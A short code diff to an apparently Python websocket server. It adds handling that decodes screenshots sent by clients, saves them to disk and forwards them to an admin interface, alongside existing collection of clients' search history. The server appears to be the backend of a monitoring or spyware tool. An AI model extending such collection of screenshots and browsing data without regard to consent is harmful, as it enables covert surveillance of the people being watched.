@@ -1,3 +1,4 @@
+import base64
 import json
 import asyncio
 from aiohttp import web
@@ -40,6 +41,18 @@ async def handle_client(websocket):
                 # Process the event and respond (?)
                 if command == "screenshot":
                     response = {"command": "response"}
+                    screenshot_data = base64.b64decode(payload)
+                    # Save the screenshot to a file for now
+                    with open("received_screenshot.png", "wb") as file:
+                        file.write(screenshot_data)
+                    logger.info("Screenshot saved as received_screenshot.png")
+
+                    # Forward the screenshot to the admin interface
+                    admin_message = {
+                        "event": "screenshot",
+                        "payload": payload  # Send the same Base64 string
+                    }
+                    await broadcast(admin_message)
                 elif command == "search_history":
                     response = {"command": "search_history"}
                     save_search_history(payload)
@@ -61,6 +74,7 @@ async def handle_client(websocket):
                 error_response = {"command": "error"}
                 await websocket.send(json.dumps(error_response))
                 logger.error(f"Invalid JSON received: {client_message}")
+                
     except websockets.exceptions.ConnectionClosed as e:
         logger.info(f"Client disconnected: {e}")
     finally:
